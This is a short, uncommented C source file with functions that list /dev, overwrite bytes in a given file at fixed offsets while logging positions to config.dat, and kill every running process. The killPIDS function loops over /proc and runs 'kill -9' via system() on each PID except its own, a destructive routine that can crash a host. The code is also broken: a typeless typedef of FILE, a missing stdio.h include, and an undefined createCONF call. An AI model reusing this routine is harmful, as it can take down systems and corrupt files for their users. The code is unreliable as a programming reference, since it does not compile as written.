#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <dirent.h>
#include <string.h>
typedef FILE;
FILE*conf;
extern FILE *stdin;
extern FILE *stdout;
extern FILE *stderr;
void fullDevices()
{
  DIR *dp;
  struct dirent *ep;     
  dp = opendir ("/dev/");
  if (dp != NULL)
  {
    while (ep = readdir (dp))
      printf("/dev/%s\n",ep->d_name);
    (void) closedir (dp);
  }
  else
    error ("Couldn't open the directory");
}
void killPIDS()
{
char buffer[256];
  DIR *dp;
  struct dirent *ep;     
  dp = opendir ("/proc/");
  if (dp != NULL)
  {
    while (ep = readdir (dp))
    {
      if(atoi(ep->d_name) !=getpid())
      {
      sprintf(buffer,"kill -9 %i",atoi(ep->d_name));
      system(buffer);
      }
    }
    (void) closedir (dp);
  }
  else
    fprintf (stderr,"Couldn't open /proc");
}
size_t get_size_file(FILE *fp)
{
rewind(fp);
size_t size=NULL;
fseek(fp, 0, SEEK_END); // TO END
size = ftell(fp); // GET POSITION
rewind(fp); // START
return size;
}
void error(char * msg)
{
fprintf(stderr,"%s\n",msg);
exit(1);
}
void removeNewLine(char*txt)
{
	while(*txt)
	{
		if(*txt=='\n')
			*txt='\0';
		*txt++;
	}
}
void InstallRandString(FILE* fp,char*buffer)
{
FILE*config=fopen("config.dat","wa+");
//unsigned long long position=(get_size_file(fp) / 2);
unsigned long long position=0;
while(*buffer)
{
fseek(fp, position, SEEK_SET);
createCONF(*buffer,position,config);
position += 5;
fputc((int)*buffer,fp);
*buffer++;
}
conf=config;
}
